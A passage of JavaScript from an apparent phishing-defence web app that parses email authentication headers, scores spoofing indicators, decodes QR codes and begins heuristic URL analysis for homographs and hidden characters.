                + '<div class="feedback-body">Enter a <strong>Gemini</strong> or <strong>OpenAI</strong> API key in the Analyzer tab, then try again. Or use the built-in scenarios with the offline heuristic engine.</div>';
            dom.simFeedbackArea.classList.remove('hidden');
            return;
        }

        if (!dom.btnGenerateChallenge) return;
        dom.btnGenerateChallenge.disabled = true;
        const originalLabel = dom.btnGenerateChallenge.innerHTML;
        dom.btnGenerateChallenge.innerHTML = '⏳ Generating...';

        try {
            const provider = aiProvider === 'openai' ? 'openai' : 'gemini';
            const raw = provider === 'openai'
                ? await generateScenarioOpenAI(apiKey)
                : await generateScenarioGemini(apiKey);
            const scenario = normalizeGeneratedScenario(raw);
            SIM_SCENARIOS.push(scenario);
            currentSimIndex = SIM_SCENARIOS.length - 1;
            renderSimScenario();

            dom.simFeedbackArea.className = 'sim-feedback-area correct';
            dom.simFeedbackArea.innerHTML =
                  '<div class="feedback-headline">✨ New AI-Generated Challenge Added</div>'
                + '<div class="feedback-body">A fresh <strong>' + escapeHtml(scenario.category) + '</strong> scenario was generated by '
                + (provider === 'openai' ? 'GPT-4o-mini' : 'Gemini 1.5 Flash') + ' — scenario ' + SIM_SCENARIOS.length + ' of ' + SIM_SCENARIOS.length + '. Apply your instincts!</div>';
            dom.simFeedbackArea.classList.remove('hidden');
        } catch (err) {
            console.error('Scenario generation failed:', err);
            dom.simFeedbackArea.className = 'sim-feedback-area incorrect';
            dom.simFeedbackArea.innerHTML =
                  '<div class="feedback-headline">⚠️ Generation Failed</div>'
                + '<div class="feedback-body">' + escapeHtml(err.message || 'Could not generate the scenario.') + '</div>';
            dom.simFeedbackArea.classList.remove('hidden');
        } finally {
            dom.btnGenerateChallenge.disabled = false;
            dom.btnGenerateChallenge.innerHTML = originalLabel;
        }
    }

    // ================================================================
    //  EMAIL HEADER & AUTHENTICATION INSPECTOR
    // ================================================================
    function setHeaderLoading(on) {
        if (dom.analyzeHeaderBtn) dom.analyzeHeaderBtn.disabled = on;
        if (dom.headerLoading) dom.headerLoading.classList.toggle('hidden', !on);
    }

    function setHeaderStatus(msg) {
        if (dom.headerStatusText) dom.headerStatusText.textContent = msg;
    }

    function clearHeaderResults() {
        if (dom.headerResultArea) dom.headerResultArea.innerHTML = '';
        lastHeaderScanData = null;
    }

    function parseRawHeaders(rawText) {
        const text = (rawText || '').replace(/\r\n/g, '\n').replace(/\r/g, '\n');
        const lines = text.split('\n');
        const unfolded = [];

        for (let i = 0; i < lines.length; i++) {
            const line = lines[i];
            if ((line.startsWith(' ') || line.startsWith('\t')) && unfolded.length > 0) {
                unfolded[unfolded.length - 1] += ' ' + line.trim();
            } else if (line.trim() !== '') {
                unfolded.push(line.trim());
            }
        }

        const headers = {};
        const multiHeaders = {
            received: [],
            'authentication-results': [],
            'arc-authentication-results': [],
            'dkim-signature': [],
            'received-spf': []
        };

        unfolded.forEach(line => {
            const colonIdx = line.indexOf(':');
            if (colonIdx > 0) {
                const key = line.substring(0, colonIdx).trim().toLowerCase();
                const val = line.substring(colonIdx + 1).trim();
                if (multiHeaders[key] !== undefined) {
                    multiHeaders[key].push(val);
                } else {
                    headers[key] = val;
                }
            }
        });

        return {
            raw: rawText,
            headers,
            multiHeaders,
            from: headers['from'] || '',
            to: headers['to'] || '',
            replyTo: headers['reply-to'] || '',
            returnPath: headers['return-path'] || '',
            subject: headers['subject'] || '',
            date: headers['date'] || '',
            messageId: headers['message-id'] || '',
            xOriginatingIp: headers['x-originating-ip'] || headers['x-sender-ip'] || ''
        };
    }

    function extractEmailAddress(str) {
        if (!str) return { displayName: '', email: '', domain: '' };
        const match = str.match(/(?:"?([^"]*)"?\s*)?<?([a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}))>?/);
        if (match) {
            return {
                displayName: (match[1] || '').trim(),
                email: (match[2] || '').trim().toLowerCase(),
                domain: (match[3] || '').trim().toLowerCase()
            };
        }
        return { displayName: '', email: str.trim(), domain: '' };
    }

    function extractAuthResults(parsed) {
        const authStrings = [
            ...(parsed.multiHeaders['authentication-results'] || []),
            ...(parsed.multiHeaders['arc-authentication-results'] || []),
            ...(parsed.multiHeaders['received-spf'] || [])
        ].join(' ');

        let spf = 'none';
        let spfDetails = 'No SPF authentication header found.';
        const spfMatch = authStrings.match(/spf=(pass|fail|softfail|neutral|none|permerror|temperror)/i)
                      || authStrings.match(/Received-SPF:\s*(pass|fail|softfail|neutral|none)/i);
        if (spfMatch) {
            spf = spfMatch[1].toLowerCase();
            if (spf === 'pass') spfDetails = 'Sender IP is authorized in SPF DNS record.';
            else if (spf === 'fail') spfDetails = 'Sender IP is explicitly NOT authorized (SPF Hardfail).';
            else if (spf === 'softfail') spfDetails = 'Sender IP is questionable/not explicitly authorized (SPF Softfail ~all).';
            else if (spf === 'neutral') spfDetails = 'SPF domain owner does not assert authorization (?all).';
        }

        let dkim = 'none';
        let dkimDetails = 'No DKIM cryptographic signature header found.';
        const dkimMatch = authStrings.match(/dkim=(pass|fail|neutral|none|invalid)/i);
        if (dkimMatch) {
            dkim = dkimMatch[1].toLowerCase();
            if (dkim === 'pass') dkimDetails = 'DKIM signature valid and cryptographic digest matches.';
            else if (dkim === 'fail' || dkim === 'invalid') dkimDetails = 'DKIM signature invalid, expired, or body modified in transit.';
        } else if (parsed.multiHeaders['dkim-signature'] && parsed.multiHeaders['dkim-signature'].length > 0) {
            dkim = 'present';
            dkimDetails = 'DKIM signature present in header; receiver verification record absent.';
        }

        let dmarc = 'none';
        let dmarcDetails = 'No DMARC policy evaluation found in authentication headers.';
        const dmarcMatch = authStrings.match(/dmarc=(pass|fail|action|none)/i);
        const policyMatch = authStrings.match(/p=(reject|quarantine|none)/i);
        if (dmarcMatch) {
            dmarc = dmarcMatch[1].toLowerCase();
            const pol = policyMatch ? policyMatch[1] : 'none';
            if (dmarc === 'pass') dmarcDetails = 'DMARC alignment passed (policy: ' + pol + ').';
            else if (dmarc === 'fail') dmarcDetails = 'DMARC alignment failed (disposition: ' + pol + ').';
        }

        const fromParsed = extractEmailAddress(parsed.from);
        const returnParsed = extractEmailAddress(parsed.returnPath);
        const replyParsed = extractEmailAddress(parsed.replyTo);

        let alignment = 'unknown';
        let alignmentDetails = 'Cannot determine domain alignment.';
        if (fromParsed.domain && returnParsed.domain) {
            if (fromParsed.domain === returnParsed.domain || returnParsed.domain.endsWith('.' + fromParsed.domain) || fromParsed.domain.endsWith('.' + returnParsed.domain)) {
                alignment = 'aligned';
                alignmentDetails = 'Return-Path (@' + returnParsed.domain + ') matches From domain (@' + fromParsed.domain + ').';
            } else {
                alignment = 'mismatch';
                alignmentDetails = 'Return-Path (@' + returnParsed.domain + ') diverges from From domain (@' + fromParsed.domain + '). Classic spoofing/relay indicator.';
            }
        }

        return {
            spf, spfDetails,
            dkim, dkimDetails,
            dmarc, dmarcDetails,
            alignment, alignmentDetails,
            fromParsed, returnParsed, replyParsed
        };
    }

    function parseReceivedHops(multiReceived) {
        if (!multiReceived || multiReceived.length === 0) return [];
        const reversed = [...multiReceived].reverse();
        return reversed.map((hopText, idx) => {
            const fromMatch = hopText.match(/from\s+([^\s;]+)(?:\s+\((?:[^\)]*?\[?([0-9a-fA-F:.]+)\]?)\))?/i);
            const byMatch = hopText.match(/by\s+([^\s;]+)/i);
            const withMatch = hopText.match(/with\s+([^\s;]+)/i);
            const dateMatch = hopText.match(/;\s*(.+)$/);

            const fromHost = fromMatch ? fromMatch[1] : 'Unknown source';
            const ip = fromMatch && fromMatch[2] ? fromMatch[2] : (hopText.match(/\[([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\]/) || [])[1] || '';
            const byHost = byMatch ? byMatch[1] : 'MTA Relay';
            const protocol = withMatch ? withMatch[1] : 'SMTP';
            const timeStr = dateMatch ? dateMatch[1].trim() : '';

            return {
                step: idx + 1,
                fromHost,
                ip,
                byHost,
                protocol,
                timeStr,
                raw: hopText
            };
        });
    }

    function analyzeHeadersHeuristic(rawText) {
        const parsed = parseRawHeaders(rawText);
        const auth = extractAuthResults(parsed);
        const hops = parseReceivedHops(parsed.multiHeaders.received);

        const findings = [];
        let riskScore = 10;
        let isSpoofed = false;

        const brandKeywords = ['paypal', 'microsoft', 'office 365', 'chase', 'apple', 'google', 'amazon', 'docusign', 'wellsfargo', 'bank of america', 'dhl', 'fedex', 'usps'];
        const displayLower = (auth.fromParsed.displayName || '').toLowerCase();
        const fromDomain = auth.fromParsed.domain || '';

        const matchedBrand = brandKeywords.find(b => displayLower.includes(b));
        if (matchedBrand) {
            const safeBrandClean = matchedBrand.replace(/\s+/g, '');
            if (!fromDomain.includes(safeBrandClean)) {
                riskScore += 45;
                isSpoofed = true;
                findings.push({
                    severity: 'danger',
                    icon: '🚨',
                    title: 'Display Name Brand Spoofing (' + matchedBrand.toUpperCase() + ')',
                    detail: 'Display name claims "' + auth.fromParsed.displayName + '", but the originating domain is "@' + fromDomain + '". This is classic sender impersonation.'
                });
            }
        }

        if (auth.spf === 'fail') {
            riskScore += 40;
            findings.push({
                severity: 'danger',
                icon: '❌',
                title: 'SPF Hardfail (Unauthorized Mail Server)',
                detail: 'The transmitting IP is explicitly prohibited from sending mail on behalf of the declared domain.'
            });
        } else if (auth.spf === 'softfail') {
            riskScore += 25;
            findings.push({
                severity: 'warn',
                icon: '⚠️',
                title: 'SPF Softfail (~all Violation)',
                detail: 'The sender server is not designated as authorized in the DNS SPF record (~all).'
            });
        } else if (auth.spf === 'none') {
            riskScore += 10;
            findings.push({
                severity: 'warn',
                icon: 'ℹ️',
                title: 'Missing SPF Authentication',
                detail: 'No SPF evaluation result found. Recipient mail servers cannot verify sending MTA authenticity.'
            });
        }

        if (auth.dkim === 'fail' || auth.dkim === 'invalid') {
            riskScore += 35;
            findings.push({
                severity: 'danger',
                icon: '❌',
                title: 'DKIM Signature Verification Failed',
                detail: 'Cryptographic DKIM signature failed verification. The email body or critical headers may have been altered or forged.'
            });
        }

        if (auth.dmarc === 'fail') {
            riskScore += 35;
            findings.push({
                severity: 'danger',
                icon: '🚨',
                title: 'DMARC Authentication Failed',
                detail: 'Neither SPF nor DKIM passed in alignment with the From header domain. This message violates the published DMARC policy.'
            });
        }

        if (auth.alignment === 'mismatch') {
            riskScore += 25;
            findings.push({
                severity: 'warn',
                icon: '🔄',
                title: 'Envelope Return-Path / From Domain Mismatch',
                detail: 'From header is "@' + auth.fromParsed.domain + '" while Return-Path bounce address routes to "@' + auth.returnParsed.domain + '".'
            });
        }

        if (auth.replyParsed.email && auth.fromParsed.email && auth.replyParsed.domain !== auth.fromParsed.domain) {
            riskScore += 35;
            findings.push({
                severity: 'danger',
                icon: '🪤',
                title: 'Reply-To Diversion (Hijacked Reply Channel)',
                detail: 'Replies will NOT go to the sender (@' + auth.fromParsed.domain + ') but will be diverted to "' + auth.replyParsed.email + '". Classic BEC wire scam tactic.'
            });
        }

        if (findings.length === 0 && auth.spf === 'pass' && (auth.dkim === 'pass' || auth.dkim === 'present') && (auth.dmarc === 'pass' || auth.alignment === 'aligned')) {
            riskScore = 5;
            findings.push({
                severity: 'safe',
                icon: '✅',
                title: 'Full Cryptographic Authentication Passed',
                detail: 'SPF and DKIM records are valid and fully aligned with the sender domain. No signs of sender forgery or relay hijacking.'
            });
        }

        riskScore = Math.min(100, Math.max(0, riskScore));

        let verdict = 'CLEAN & AUTHENTIC';
        let verdictClass = 'verdict-clean';
        if (riskScore >= 70 || isSpoofed) {
            verdict = 'CRITICAL SPOOFING DETECTED';
            verdictClass = 'verdict-phishing';
        } else if (riskScore >= 40) {
            verdict = 'SUSPICIOUS AUTHENTICATION';
            verdictClass = 'verdict-suspicious';
        }

        return {
            verdict,
            verdictClass,
            riskScore,
            parsed,
            auth,
            hops,
            findings,
            engine: 'Local Heuristic Header Engine'
        };
    }

    async function analyzeHeadersWithGemini(rawHeaders, key) {
        const url = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=' + encodeURIComponent(key);
        const prompt = `You are a Principal Email Security & Forensic Analyst.
Analyze the following raw email RFC 5322 headers for spoofing, SPF/DKIM/DMARC status, relay anomalies, and sender impersonation.
Return ONLY valid JSON matching this schema:
{
  "verdict": "CRITICAL SPOOFING DETECTED" | "SUSPICIOUS AUTHENTICATION" | "CLEAN & AUTHENTIC",
  "verdictClass": "verdict-phishing" | "verdict-suspicious" | "verdict-clean",
  "riskScore": <integer 0-100>,
  "summary": "<1-2 sentence executive forensic conclusion>",
  "findings": [
    {
      "severity": "danger" | "warn" | "safe",
      "icon": "🚨" | "⚠️" | "✅" | "❌",
      "title": "<Short finding title>",
      "detail": "<Explanation of why this indicator matters>"
    }
  ],
  "recommendations": [
    "<Actionable step for security team or user>"
  ]
}

Raw Headers:
${rawHeaders.substring(0, 5000)}`;

        const payload = {
            contents: [{ parts: [{ text: prompt }] }],
            generationConfig: {
                responseMimeType: 'application/json',
                temperature: 0.1
            }
        };

        const resp = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!resp.ok) {
            let errText = '';
            try { errText = (await resp.json()).error?.message || resp.statusText; } catch (_) { errText = await resp.text(); }
            throw new Error('Gemini Header API error (' + resp.status + '): ' + errText);
        }

        const data = await resp.json();
        const text = data.candidates?.[0]?.content?.parts?.[0]?.text;
        if (!text) throw new Error('Gemini returned an empty header analysis response.');
        return JSON.parse(text);
    }

    async function analyzeHeadersWithOpenAI(rawHeaders, key) {
        const prompt = `You are a Principal Email Security & Forensic Analyst.
Analyze the following raw RFC 5322 email headers. Return valid JSON only.`;

        const resp = await fetch('https://api.openai.com/v1/chat/completions', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${key}`
            },
            body: JSON.stringify({
                model: 'gpt-4o-mini',
                temperature: 0.1,
                messages: [
                    { role: 'system', content: prompt },
                    { role: 'user', content: rawHeaders.substring(0, 5000) }
                ],
                response_format: { type: 'json_object' }
            })
        });

        if (!resp.ok) {
            let errText = '';
            try { errText = (await resp.json()).error?.message || resp.statusText; } catch (_) { errText = await resp.text(); }
            throw new Error('OpenAI Header API error (' + resp.status + '): ' + errText);
        }

        const data = await resp.json();
        const content = data.choices?.[0]?.message?.content;
        if (!content) throw new Error('OpenAI returned an empty response.');
        return JSON.parse(content);
    }

    async function handleHeaderScan() {
        const rawText = dom.headerInput ? dom.headerInput.value.trim() : '';
        if (!rawText) {
            alert('Please paste raw email headers or select a Header Test Case.');
            return;
        }

        clearHeaderResults();
        setHeaderLoading(true);
        setHeaderStatus('Parsing email authentication & routing headers…');

        try {
            const heuristicResult = analyzeHeadersHeuristic(rawText);
            let finalResult = heuristicResult;

            if (aiProvider !== 'heuristic' && apiKey) {
                setHeaderStatus('Running deep AI forensic analysis (' + (aiProvider === 'gemini' ? 'Gemini 1.5 Flash' : 'GPT-4o-mini') + ')…');
                try {
                    const aiData = aiProvider === 'openai'
                        ? await analyzeHeadersWithOpenAI(rawText, apiKey)
                        : await analyzeHeadersWithGemini(rawText, apiKey);

                    if (aiData.findings && Array.isArray(aiData.findings) && aiData.findings.length) {
                        heuristicResult.findings = aiData.findings;
                    }
                    if (typeof aiData.riskScore === 'number') heuristicResult.riskScore = aiData.riskScore;
                    if (aiData.verdict) heuristicResult.verdict = aiData.verdict;
                    if (aiData.verdictClass) heuristicResult.verdictClass = aiData.verdictClass;
                    if (aiData.summary) heuristicResult.summary = aiData.summary;
                    if (aiData.recommendations) heuristicResult.recommendations = aiData.recommendations;
                    heuristicResult.engine = aiProvider === 'openai' ? 'OpenAI GPT-4o-mini + Local Parser' : 'Google Gemini 1.5 Flash + Local Parser';
                } catch (aiErr) {
                    console.warn('AI header forensic analysis failed, fallback to local heuristics:', aiErr);
                }
            }

            lastHeaderScanData = {
                timestamp: new Date().toISOString(),
                engine: heuristicResult.engine,
                data: heuristicResult
            };

            renderHeaderResults(heuristicResult);
        } catch (err) {
            console.error('Header analysis failed:', err);
            dom.headerResultArea.innerHTML =
                '<div class="error-box"><strong>Header Analysis Error:</strong> ' + escapeHtml(err.message || 'Failed to parse headers.') + '</div>';
        } finally {
            setHeaderLoading(false);
        }
    }

    function renderHeaderResults(data) {
        if (!dom.headerResultArea) return;
        const auth = data.auth;
        const parsed = data.parsed;
        const hops = data.hops;

        const getAuthBadge = (status) => {
            if (status === 'pass' || status === 'present') return '<span class="auth-badge-pill auth-pass">✅ PASS</span>';
            if (status === 'fail' || status === 'invalid') return '<span class="auth-badge-pill auth-fail">❌ FAIL</span>';
            if (status === 'softfail' || status === 'warn') return '<span class="auth-badge-pill auth-softfail">⚠️ SOFTFAIL</span>';
            if (status === 'aligned') return '<span class="auth-badge-pill auth-pass">✅ ALIGNED</span>';
            if (status === 'mismatch') return '<span class="auth-badge-pill auth-fail">❌ MISMATCH</span>';
            return '<span class="auth-badge-pill auth-none">⚪ NONE</span>';
        };

        let html = '';

        // 1. Verdict Banner
        html += '<div class="verdict-banner ' + escapeHtml(data.verdictClass) + '">'
              + '<span class="verdict-icon">' + (data.verdictClass === 'verdict-clean' ? '✅' : data.verdictClass === 'verdict-suspicious' ? '⚠️' : '🚨') + '</span>'
              + '<div>'
              + '<h3 class="verdict-title">' + escapeHtml(data.verdict) + '</h3>'
              + '<p class="verdict-meta">Header Risk Score: <strong>' + data.riskScore + '/100</strong> &bull; Engine: ' + escapeHtml(data.engine) + '</p>'
              + '</div>'
              + '</div>';

        // 2. Authentication Matrix (SPF / DKIM / DMARC / Domain Alignment)
        html += '<div class="auth-matrix-grid">'
              + '<div class="auth-card">'
              + '<span class="auth-card-title">SPF Check</span>'
              + getAuthBadge(auth.spf)
              + '<span class="auth-card-desc">' + escapeHtml(auth.spfDetails) + '</span>'
              + '</div>'
              + '<div class="auth-card">'
              + '<span class="auth-card-title">DKIM Signature</span>'
              + getAuthBadge(auth.dkim)
              + '<span class="auth-card-desc">' + escapeHtml(auth.dkimDetails) + '</span>'
              + '</div>'
              + '<div class="auth-card">'
              + '<span class="auth-card-title">DMARC Policy</span>'
              + getAuthBadge(auth.dmarc)
              + '<span class="auth-card-desc">' + escapeHtml(auth.dmarcDetails) + '</span>'
              + '</div>'
              + '<div class="auth-card">'
              + '<span class="auth-card-title">Domain Alignment</span>'
              + getAuthBadge(auth.alignment)
              + '<span class="auth-card-desc">' + escapeHtml(auth.alignmentDetails) + '</span>'
              + '</div>'
              + '</div>';

        // 3. Key Metadata Card
        const returnMismatch = auth.alignment === 'mismatch';
        const replyMismatch = auth.replyParsed.email && auth.fromParsed.email && auth.replyParsed.domain !== auth.fromParsed.domain;

        html += '<div class="header-meta-grid">'
              + '<div class="header-meta-row"><span class="header-meta-label">From:</span><span class="header-meta-val">' + escapeHtml(parsed.from || 'Not specified') + '</span></div>'
              + (parsed.returnPath ? '<div class="header-meta-row"><span class="header-meta-label">Return-Path:</span><span class="header-meta-val ' + (returnMismatch ? 'val-mismatch' : 'val-aligned') + '">' + escapeHtml(parsed.returnPath) + (returnMismatch ? ' ⚠️ (MISMATCH)' : '') + '</span></div>' : '')
              + (parsed.replyTo ? '<div class="header-meta-row"><span class="header-meta-label">Reply-To:</span><span class="header-meta-val ' + (replyMismatch ? 'val-mismatch' : '') + '">' + escapeHtml(parsed.replyTo) + (replyMismatch ? ' 🚨 (HIJACKED/EXTERNAL)' : '') + '</span></div>' : '')
              + '<div class="header-meta-row"><span class="header-meta-label">To:</span><span class="header-meta-val">' + escapeHtml(parsed.to || 'Not specified') + '</span></div>'
              + '<div class="header-meta-row"><span class="header-meta-label">Subject:</span><span class="header-meta-val">' + escapeHtml(parsed.subject || '(No Subject)') + '</span></div>'
              + (parsed.date ? '<div class="header-meta-row"><span class="header-meta-label">Date:</span><span class="header-meta-val">' + escapeHtml(parsed.date) + '</span></div>' : '')
              + (parsed.messageId ? '<div class="header-meta-row"><span class="header-meta-label">Message-ID:</span><span class="header-meta-val">' + escapeHtml(parsed.messageId) + '</span></div>' : '')
              + '</div>';

        // 4. Forensic Findings / Spoofing Indicators
        if (data.findings && data.findings.length) {
            html += '<div class="spoof-indicators-card">'
                  + '<h4 class="card-label">🔍 Forensic Header Findings (' + data.findings.length + ')</h4>'
                  + '<ul class="spoof-list">';
            data.findings.forEach(f => {
                const itemClass = f.severity === 'danger' ? 'spoof-item-danger' : f.severity === 'warn' ? 'spoof-item-warn' : 'spoof-item-safe';
                html += '<li class="spoof-item ' + itemClass + '">'
                      + '<span class="spoof-icon">' + (f.icon || '⚡') + '</span>'
                      + '<div><strong>' + escapeHtml(f.title) + ':</strong> ' + escapeHtml(f.detail) + '</div>'
                      + '</li>';
            });
            html += '</ul></div>';
        }

        renderHeaderHopsAndExport(html, data);
    }

    function renderHeaderHopsAndExport(baseHtml, data) {
        let html = baseHtml;
        const hops = data.hops;
        const parsed = data.parsed;
        const auth = data.auth;

        // 5. Relay Hop Route Timeline
        if (hops && hops.length) {
            html += '<div class="hop-chain-container">'
                  + '<h4 class="card-label">🌐 Mail Relay Route Timeline (' + hops.length + ' Hop' + (hops.length > 1 ? 's' : '') + ')</h4>'
                  + '<div class="hop-timeline">';
            hops.forEach((hop, i) => {
                const isOrigin = i === 0;
                const isDest = i === hops.length - 1;
                const nodeClass = isOrigin ? 'hop-origin' : isDest ? 'hop-dest' : '';
                const tagLabel = isOrigin ? 'Originating Server (Hop 1)' : isDest ? ('Final Gateway (Hop ' + hop.step + ')') : ('Relay MTA (Hop ' + hop.step + ')');

                html += '<div class="hop-node ' + nodeClass + '">'
                      + '<div class="hop-node-header">'
                      + '<span class="hop-step-tag">' + tagLabel + '</span>'
                      + (hop.ip ? '<span class="hop-ip-tag">' + escapeHtml(hop.ip) + '</span>' : '')
                      + '</div>'
                      + '<div class="hop-node-body"><strong>From:</strong> ' + escapeHtml(hop.fromHost) + ' &rarr; <strong>By:</strong> ' + escapeHtml(hop.byHost) + ' (' + escapeHtml(hop.protocol) + ')</div>'
                      + (hop.timeStr ? '<div class="hop-time">🕒 ' + escapeHtml(hop.timeStr) + '</div>' : '')
                      + '</div>';
            });
            html += '</div></div>';
        }

        // 6. Action Bar / Export
        html += '<div class="export-actions-row">'
              + '<button type="button" class="btn-export" id="btnCopyHeaderReport">📋 Copy Forensic Report</button>'
              + '</div>';

        dom.headerResultArea.innerHTML = html;

        // Wire copy button
        const copyBtn = $('#btnCopyHeaderReport');
        if (copyBtn) {
            copyBtn.addEventListener('click', () => {
                let md = '# Phish-Guard Email Header Forensic Report\n\n';
                md += '- **Verdict:** ' + data.verdict + '\n';
                md += '- **Risk Score:** ' + data.riskScore + '/100\n';
                md += '- **Engine:** ' + data.engine + '\n';
                md += '- **From:** ' + parsed.from + '\n';
                md += '- **Return-Path:** ' + parsed.returnPath + '\n';
                md += '- **Reply-To:** ' + (parsed.replyTo || 'None') + '\n';
                md += '- **Subject:** ' + parsed.subject + '\n\n';
                md += '## Authentication Checks\n';
                md += '- **SPF:** ' + auth.spf.toUpperCase() + ' - ' + auth.spfDetails + '\n';
                md += '- **DKIM:** ' + auth.dkim.toUpperCase() + ' - ' + auth.dkimDetails + '\n';
                md += '- **DMARC:** ' + auth.dmarc.toUpperCase() + ' - ' + auth.dmarcDetails + '\n';
                md += '- **Alignment:** ' + auth.alignment.toUpperCase() + ' - ' + auth.alignmentDetails + '\n\n';
                if (data.findings && data.findings.length) {
                    md += '## Forensic Findings\n';
                    data.findings.forEach(f => {
                        md += '- ' + (f.icon || '⚡') + ' **' + f.title + ':** ' + f.detail + '\n';
                    });
                }
                navigator.clipboard.writeText(md).then(() => {
                    const oldText = copyBtn.innerHTML;
                    copyBtn.innerHTML = '✅ Copied!';
                    setTimeout(() => { copyBtn.innerHTML = oldText; }, 2000);
                });
            });
        }
    }

    // ================================================================
    //  QR CODE ("QUISHING") & DEEP URL SANDBOX INSPECTOR
    // ================================================================
    let lastUrlScanData = null;

    function initQrScanner() {
        if (!dom.qrDropZone || !dom.qrFileInput) return;

        dom.qrDropZone.addEventListener('click', (e) => {
            if (e.target.closest('#qrPreviewArea')) return;
            dom.qrFileInput.click();
        });

        dom.qrFileInput.addEventListener('change', (e) => {
            const file = e.target.files && e.target.files[0];
            if (file) processQrImageFile(file);
        });

        ['dragenter', 'dragover'].forEach(name => {
            dom.qrDropZone.addEventListener(name, (e) => {
                e.preventDefault();
                e.stopPropagation();
                dom.qrDropZone.classList.add('dragover');
            });
        });

        ['dragleave', 'drop'].forEach(name => {
            dom.qrDropZone.addEventListener(name, (e) => {
                e.preventDefault();
                e.stopPropagation();
                dom.qrDropZone.classList.remove('dragover');
            });
        });

        dom.qrDropZone.addEventListener('drop', (e) => {
            const file = e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0];
            if (file && file.type.startsWith('image/')) {
                processQrImageFile(file);
            }
        });

        window.addEventListener('paste', (e) => {
            const quishTab = document.getElementById('quishingTab');
            if (!quishTab || !quishTab.classList.contains('active')) return;
            const items = (e.clipboardData || e.originalEvent.clipboardData)?.items;
            if (!items) return;
            for (let i = 0; i < items.length; i++) {
                if (items[i].type.indexOf('image') !== -1) {
                    const blob = items[i].getAsFile();
                    if (blob) processQrImageFile(blob);
                    break;
                }
            }
        });
    }

    function processQrImageFile(file) {
        if (!file) return;
        const reader = new FileReader();
        reader.onload = (e) => {
            const dataUrl = e.target.result;
            if (dom.qrPreviewImg) dom.qrPreviewImg.src = dataUrl;
            if (dom.qrDropPrompt) dom.qrDropPrompt.classList.add('hidden');
            if (dom.qrPreviewArea) dom.qrPreviewArea.classList.remove('hidden');

            const img = new Image();
            img.onload = () => {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    canvas.width = img.naturalWidth || img.width;
                    canvas.height = img.naturalHeight || img.height;
                    ctx.drawImage(img, 0, 0);

                    if (typeof window.jsQR === 'function') {
                        const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                        const code = window.jsQR(imgData.data, imgData.width, imgData.height, {
                            inversionAttempts: 'dontInvert'
                        }) || window.jsQR(imgData.data, imgData.width, imgData.height, {
                            inversionAttempts: 'onlyInvert'
                        });

                        if (code && code.data) {
                            if (dom.qrDecodedPayload) dom.qrDecodedPayload.textContent = code.data;
                            if (dom.urlInput) dom.urlInput.value = code.data;
                            handleUrlScan();
                            return;
                        }
                    }
                    if (dom.qrDecodedPayload) {
                        dom.qrDecodedPayload.textContent = 'No QR barcode detected in image. Enter URL below.';
                    }
                } catch (err) {
                    console.warn('QR decode error:', err);
                }
            };
            img.src = dataUrl;
        };
        reader.readAsDataURL(file);
    }

    function setUrlLoading(on) {
        if (dom.analyzeUrlBtn) dom.analyzeUrlBtn.disabled = on;
        if (dom.urlLoading) dom.urlLoading.classList.toggle('hidden', !on);
    }

    function setUrlStatus(msg) {
        if (dom.urlStatusText) dom.urlStatusText.textContent = msg;
    }

    function clearUrlResults() {
        if (dom.urlResultArea) dom.urlResultArea.innerHTML = '';
        lastUrlScanData = null;
    }

    function analyzeUrlHeuristic(rawInput) {
        let input = (rawInput || '').trim();
        const findings = [];
        let riskScore = 10;

        const zeroWidthRegex = /[\u200B-\u200D\uFEFF\u00A0\u00AD]/g;
        const zeroWidthMatches = input.match(zeroWidthRegex);
        if (zeroWidthMatches) {
            riskScore += 35;
            findings.push({
                severity: 'danger',
                icon: '👻',
                title: 'Stealth Zero-Width Unicode Characters Detected',
                detail: 'Found ' + zeroWidthMatches.length + ' hidden character(s) used to evade regex filters.'
            });
            input = input.replace(zeroWidthRegex, '');
        }

        let parsed;
        try {
            if (!/^https?:\/\//i.test(input) && !/^ftp:\/\//i.test(input)) {
                parsed = new URL('https://' + input);
            } else {
                parsed = new URL(input);
            }
        } catch (e) {
            return {
                rawUrl: rawInput, normalizedUrl: input, protocol: 'unknown', hostname: 'malformed', unicodeHost: 'malformed',
                pathname: '', queryParams: [], riskScore: 90, verdict: 'MALFORMED / HIGH RISK', verdictClass: 'risk-high',
                engine: 'Phish-Guard Deep URL Sandbox & Heuristic De-obfuscator',
                matrix: {
                    punycode: { status: 'danger', label: 'Malformed', detail: 'Invalid URL syntax' },
                    redirect: { status: 'safe', label: 'None', detail: 'N/A' },
                    subdomains: { status: 'safe', label: 'None', detail: 'N/A' },
                    tld: { status: 'danger', label: 'Suspicious', detail: 'Cannot extract TLD' },
                    ipDisguise: { status: 'safe', label: 'None', detail: 'N/A' }
                },
                findings: [{ severity: 'danger', icon: '🚨', title: 'Malformed URL Syntax', detail: 'URL cannot be parsed as standard RFC 3986.' }],
                summary: 'The submitted link is malformed or intentionally broken.',
                recommendations: ['Do not open or execute this link.']
            };
        }

        const hostname = parsed.hostname.toLowerCase();
        const protocol = parsed.protocol;

        if (protocol === 'http:') {
            riskScore += 15;
            findings.push({ severity: 'warn', icon: '🔓', title: 'Unencrypted HTTP Protocol', detail: 'Uses plain HTTP instead of HTTPS.' });
        }

        let isPunycode = false, unicodeHost = hostname, punycodeDetail = 'Standard ASCII format', punycodeStatus = 'safe';
        if (hostname.includes('xn--') || /[^\x00-\x7F]/.test(hostname)) {
            isPunycode = true; riskScore += 45; punycodeStatus = 'danger';
            try { unicodeHost = new URL('https://' + hostname).hostname; } catch (_) {}
            punycodeDetail = 'IDN Punycode homograph (' + hostname + ' -> ' + unicodeHost + ')';
            findings.push({ severity: 'danger', icon: '🎭', title: 'IDN Homograph Domain Spoofing (Punycode)', detail: 'Uses Punycode encoding (`' + hostname + '`) to visually impersonate trusted brands.' });
        }

        let isIpDisguised = false, ipStatus = 'safe', ipDetail = 'Standard DNS resolution';
        const isHexIp = /^0x[0-9a-fA-F]+/i.test(hostname) || /0x[0-9a-fA-F]{2}/.test(hostname);
